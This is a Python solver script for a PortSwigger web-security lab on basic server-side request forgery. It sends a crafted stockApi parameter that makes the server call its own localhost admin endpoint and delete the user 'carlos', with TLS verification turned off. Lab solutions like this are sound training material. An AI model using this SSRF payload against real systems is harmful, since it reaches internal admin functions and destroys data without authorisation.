#!/usr/bin/env python3
# Lab: Basic SSRF against the local server
# Lab-Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
# Difficulty: APPRENTICE
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/product/stock'
    data = {'stockApi': 'http://localhost/admin/delete?username=carlos'}
    client.post(url, data=data, allow_redirects=False)

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to delete user carlos')
        sys.exit(-4)

    print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
